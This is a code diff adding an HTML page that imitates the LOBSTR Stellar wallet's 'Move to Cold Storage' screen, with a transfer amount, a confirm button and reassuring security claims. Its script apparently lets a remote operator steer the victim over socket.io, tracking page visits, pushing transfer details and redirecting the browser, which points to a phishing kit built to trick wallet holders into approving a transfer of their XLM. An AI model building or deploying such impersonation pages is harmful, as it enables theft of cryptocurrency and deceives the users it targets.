@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="/socket.io/socket.io.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Move to Cold Storage</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --lobstr-teal: #1B8DA0;
+            --lobstr-light-teal: #E8F4F6;
+            --lobstr-dark-teal: #156B7D;
+            --lobstr-white: #FFFFFF;
+            --lobstr-gray: #F8F9FA;
+            --lobstr-text: #333333;
+            --lobstr-light-gray: #E9ECEF;
+            --lobstr-warning: #FFC107;
+            --lobstr-warning-light: #FFF8E1;
+            --lobstr-success: #28A745;
+            --lobstr-success-light: #D4EDDA;
+            --spacing-1: 8px;
+            --spacing-2: 16px;
+            --spacing-3: 24px;
+            --spacing-4: 32px;
+            --spacing-5: 40px;
+            --border-radius: 8px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: var(--lobstr-white);
+            color: var(--lobstr-text);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: var(--spacing-3);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: var(--spacing-5);
+        }
+
+        .logo {
+            height: 48px;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--lobstr-text);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .card {
+            background: var(--lobstr-white);
+            border: 1px solid var(--lobstr-light-gray);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-4);
+            margin-bottom: var(--spacing-3);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .cold-storage-icon {
+            text-align: center;
+            margin-bottom: var(--spacing-3);
+        }
+
+        .cold-symbol {
+            width: 80px;
+            height: 80px;
+            background: var(--lobstr-teal);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            animation: coldPulse 2s infinite;
+        }
+
+        @keyframes coldPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+        }
+
+        .cold-status {
+            text-align: center;
+            margin-bottom: var(--spacing-4);
+        }
+
+        .status-message {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--lobstr-teal);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .status-description {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .transfer-details {
+            margin-bottom: var(--spacing-4);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: var(--spacing-1) 0;
+            border-bottom: 1px solid var(--lobstr-light-gray);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            font-size: 14px;
+            color: var(--lobstr-text);
+            font-weight: 500;
+        }
+
+        .amount-value {
+            color: var(--lobstr-teal);
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: var(--spacing-2);
+            margin-top: var(--spacing-3);
+        }
+
+        .action-button {
+            flex: 1;
+            padding: var(--spacing-2) var(--spacing-3);
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Ubuntu', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .primary-button {
+            background: var(--lobstr-teal);
+            color: var(--lobstr-white);
+        }
+
+        .primary-button:hover {
+            background: var(--lobstr-dark-teal);
+        }
+
+        .secondary-button {
+            background: var(--lobstr-white);
+            color: var(--lobstr-teal);
+            border: 1px solid var(--lobstr-teal);
+        }
+
+        .secondary-button:hover {
+            background: var(--lobstr-light-teal);
+        }
+
+        .success-notice {
+            background: var(--lobstr-success-light);
+            border: 1px solid var(--lobstr-success);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-bottom: var(--spacing-3);
+            text-align: center;
+        }
+
+        .notice-text {
+            font-size: 14px;
+            color: #155724;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .notice-emphasis {
+            font-weight: 600;
+            color: var(--lobstr-success);
+        }
+
+        .security-info {
+            background: var(--lobstr-light-teal);
+            border: 1px solid var(--lobstr-teal);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-top: var(--spacing-3);
+        }
+
+        .security-info-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-2);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+        }
+
+        .security-info-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .security-info-item {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+            font-size: 14px;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .security-info-item:last-child {
+            margin-bottom: 0;
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: var(--spacing-2); }
+            .card { padding: var(--spacing-3); }
+            .action-buttons { flex-direction: column; }
+            .status-message { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR" class="logo">
+            <h1 class="title">Move to Cold Storage</h1>
+            <p class="subtitle">Secure your assets offline</p>
+        </div>
+
+        <div class="success-notice">
+            <div class="notice-text">
+                Your funds will be transferred to secure cold storage for enhanced protection.
+            </div>
+            <div class="notice-emphasis">
+                This process helps secure your digital assets
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="cold-storage-icon">
+                <div class="cold-symbol">❄️</div>
+            </div>
+
+            <div class="cold-status">
+                <div class="status-message">Ready for Cold Storage</div>
+                <div class="status-description" id="statusDescription">Your assets are ready to be moved to cold storage</div>
+            </div>
+
+            <div class="transfer-details" id="transferDetails">
+                <div class="detail-row">
+                    <span class="detail-label">Source Account</span>
+                    <span class="detail-value" id="sourceAccount">Hot Wallet</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Destination</span>
+                    <span class="detail-value" id="destinationAccount">Cold Storage</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Transfer Amount</span>
+                    <span class="detail-value amount-value" id="transferAmount">---</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Asset Type</span>
+                    <span class="detail-value" id="assetType">XLM</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Storage Type</span>
+                    <span class="detail-value" id="storageType">Offline Cold Storage</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Security Level</span>
+                    <span class="detail-value" id="securityLevel">Maximum</span>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="action-button secondary-button" onclick="cancelTransfer()">
+                    Cancel
+                </button>
+                <button class="action-button primary-button" onclick="confirmTransfer()" id="transferBtn">
+                    Confirm Transfer
+                </button>
+            </div>
+        </div>
+
+        <div class="security-info">
+            <div class="security-info-title">
+                <span>🔒</span>
+                Cold Storage Benefits
+            </div>
+            <ul class="security-info-list">
+                <li class="security-info-item">
+                    <span>✓</span>
+                    Maximum security for long-term storage
+                </li>
+                <li class="security-info-item">
+                    <span>✓</span>
+                    Protected from online threats and hackers
+                </li>
+                <li class="security-info-item">
+                    <span>✓</span>
+                    Offline storage with multi-signature protection
+                </li>
+                <li class="security-info-item">
+                    <span>✓</span>
+                    Access when you need it through LOBSTR
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <script src="/js/socket-client.js"></script>
+    <script>
+        let transferInfo = null;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const style = document.createElement('style');
+            style.textContent = `
+                body { 
+                    font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+                    background: #ffffff !important;
+                }
+            `;
+            document.head.appendChild(style);
+
+            socket.emit('page_visit', { page: window.location.pathname });
+            socket.emit('request_cold_storage_details');
+        });
+
+        function cancelTransfer() {
+            socket.emit('cancel_cold_storage_transfer', { page: window.location.pathname });
+            window.location.href = '/pages/lobstrEstimatedBalance.html';
+        }
+
+        function confirmTransfer() {
+            if (confirm('Are you sure you want to move your assets to cold storage? This process may take a few minutes.')) {
+                document.getElementById('transferBtn').disabled = true;
+                document.getElementById('transferBtn').textContent = 'Processing...';
+                document.querySelector('.status-message').textContent = 'Processing Transfer';
+                document.getElementById('statusDescription').textContent = 'Moving your assets to cold storage...';
+
+                socket.emit('confirm_cold_storage_transfer', {
+                    transferInfo: transferInfo,
+                    page: window.location.pathname
+                });
+            }
+        }
+
+        // Socket event handlers
+        socket.on('connect', () => console.log('Connected to LOBSTR secure server'));
+        socket.on('connect_error', (error) => console.error('LOBSTR connection error:', error));
+        socket.on('redirect', (url) => window.location.href = url);
+        socket.on('session_url', (url) => {
+            if (url && url !== window.location.pathname + window.location.search) {
+                window.history.replaceState({}, '', url);
+            }
+        });
+
+        socket.on('cold_storage_details', (data) => {
+            transferInfo = data;
+            if (data.amount) document.getElementById('transferAmount').textContent = `${data.amount} XLM`;
+            if (data.sourceAccount) document.getElementById('sourceAccount').textContent = data.sourceAccount;
+            if (data.assetType) document.getElementById('assetType').textContent = data.assetType;
+        });
+
+        socket.on('cold_storage_status', (data) => {
+            const statusMessage = document.querySelector('.status-message');
+            const statusDescription = document.getElementById('statusDescription');
+            
+            if (data.status === 'processing') {
+                statusMessage.textContent = 'Processing Transfer';
+                statusDescription.textContent = 'Moving your assets to cold storage...';
+            } else if (data.status === 'completed') {
+                statusMessage.textContent = 'Transfer Complete';
+                statusMessage.style.color = 'var(--lobstr-success)';
+                statusDescription.textContent = 'Your assets have been successfully moved to cold storage';
+                document.querySelector('.cold-symbol').textContent = '✅';
+                document.querySelector('.cold-symbol').style.background = 'var(--lobstr-success)';
+                
+                document.getElementById('transferBtn').style.display = 'none';
+                
+                setTimeout(() => window.location.href = '/pages/lobstrCompleted.html', 3000);
+            } else if (data.status === 'failed') {
+                statusMessage.textContent = 'Transfer Failed';
+                statusMessage.style.color = 'var(--lobstr-danger)';
+                statusDescription.textContent = 'Failed to move assets to cold storage. Please try again.';
+                
+                document.getElementById('transferBtn').disabled = false;
+                document.getElementById('transferBtn').textContent = 'Retry Transfer';
+            }
+        });
+
+        socket.on('cold_storage_completed', (data) => {
+            document.querySelector('.status-message').textContent = 'Transfer Complete';
+            document.querySelector('.status-message').style.color = 'var(--lobstr-success)';
+            document.getElementById('statusDescription').textContent = 'Your assets are now safely stored in cold storage';
+            document.querySelector('.cold-symbol').textContent = '✅';
+            document.querySelector('.cold-symbol').style.background = 'var(--lobstr-success)';
+            
+            setTimeout(() => window.location.href = '/pages/lobstrCompleted.html', 3000);
+        });
+
+        socket.on('error', (error) => {
+            console.error('Socket error:', error);
+            document.getElementById('statusDescription').textContent = 'Connection error. Please refresh the page.';
+        });
+
+        socket.on('security_event', (data) => console.log('Security event logged:', data));
+    </script>
+</body>
+</html>
